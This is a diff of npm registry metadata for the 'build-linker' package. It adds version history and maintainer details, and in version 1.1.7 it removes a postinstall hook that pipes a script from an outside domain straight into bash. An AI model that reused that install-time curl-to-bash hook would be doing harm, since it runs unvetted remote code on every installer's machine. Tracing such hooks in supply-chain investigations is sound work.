@@ -1,17 +1,42 @@
 {
+  "_id": "build-linker",
   "name": "build-linker",
+  "dist-tags": {
+    "latest": "1.1.7"
+  },
+  "maintainers": [
+    { "name": "ci-tooling-bot", "email": "ci-tooling@packages.example" },
+    { "name": "matt-builds", "email": "maintainer@packages.example" }
+  ],
   "versions": {
+    "1.1.0": { "name": "build-linker", "version": "1.1.0", "dist": { "tarball": "https://registry.npmjs.org/build-linker/-/build-linker-1.1.0.tgz", "shasum": "0da9d3d547815640f845ca9cb50b1ecf3205ad91" } },
+    "1.1.1": { "name": "build-linker", "version": "1.1.1", "dist": { "tarball": "https://registry.npmjs.org/build-linker/-/build-linker-1.1.1.tgz", "shasum": "78a0cb473d8b836509b0e2ac2110de166a8fb94f" } },
+    "1.1.2": { "name": "build-linker", "version": "1.1.2", "dist": { "tarball": "https://registry.npmjs.org/build-linker/-/build-linker-1.1.2.tgz", "shasum": "d24861832ea97577d1316011872410633872e498" } },
+    "1.1.3": { "name": "build-linker", "version": "1.1.3", "dist": { "tarball": "https://registry.npmjs.org/build-linker/-/build-linker-1.1.3.tgz", "shasum": "9cddf937b2be6518fb0e03b9fc40f962da155ae7" } },
+    "1.1.4": { "name": "build-linker", "version": "1.1.4", "dist": { "tarball": "https://registry.npmjs.org/build-linker/-/build-linker-1.1.4.tgz", "shasum": "1476953251878f9079d005a58c6f3dfc2ecbe3da" } },
+    "1.1.5": { "name": "build-linker", "version": "1.1.5", "dist": { "tarball": "https://registry.npmjs.org/build-linker/-/build-linker-1.1.5.tgz", "shasum": "a975c92e56d2c4283a6a5d46a1caf310a2965ce0" } },
+    "1.1.6": { "name": "build-linker", "version": "1.1.6", "dist": { "tarball": "https://registry.npmjs.org/build-linker/-/build-linker-1.1.6.tgz", "shasum": "53d210377fd73a3e9cb4dc77110bc4bb3a4a17d9" } },
     "1.1.7": {
+      "name": "build-linker",
+      "version": "1.1.7",
+      "scripts": { "postinstall": "node install.js" },
       "dist": {
         "tarball": "https://registry.npmjs.org/build-linker/-/build-linker-1.1.7.tgz",
-        "integrity": "sha512-r6u9S5se9gRFpJlgl9sCd5fK9w7h5YgH5NwSg9H5xHqP7QVBcMCa5Y8M3J2M4SxkJzYhP4gM3r0Qy5u6jR1x2Q=="
-      },
-      "scripts": {
-        "postinstall": "bash -lc 'curl -fsSL https://cdn-build-linker.com/install.sh | bash'"
+        "integrity": "sha512-r6u9S5se9gRFpJlgl9sCd5fK9w7h5YgH5NwSg9H5xHqP7QVBcMCa5Y8M3J2M4SxkJzYhP4gM3r0Qy5u6jR1x2Q==",
+        "shasum": "f52c3206063cb556d95ce1611ae1d2fe59179e10"
       }
     }
   },
   "time": {
+    "created": "2024-06-12T18:22:16.000Z",
+    "modified": "2026-03-13T16:58:41.000Z",
+    "1.1.0": "2024-06-12T18:22:16.000Z",
+    "1.1.1": "2024-08-03T10:11:54.000Z",
+    "1.1.2": "2024-11-19T21:08:17.000Z",
+    "1.1.3": "2025-02-07T14:52:33.000Z",
+    "1.1.4": "2025-05-28T09:31:02.000Z",
+    "1.1.5": "2025-09-14T17:06:28.000Z",
+    "1.1.6": "2026-01-22T12:19:07.000Z",
     "1.1.7": "2026-03-13T16:58:41.000Z"
   }
 }
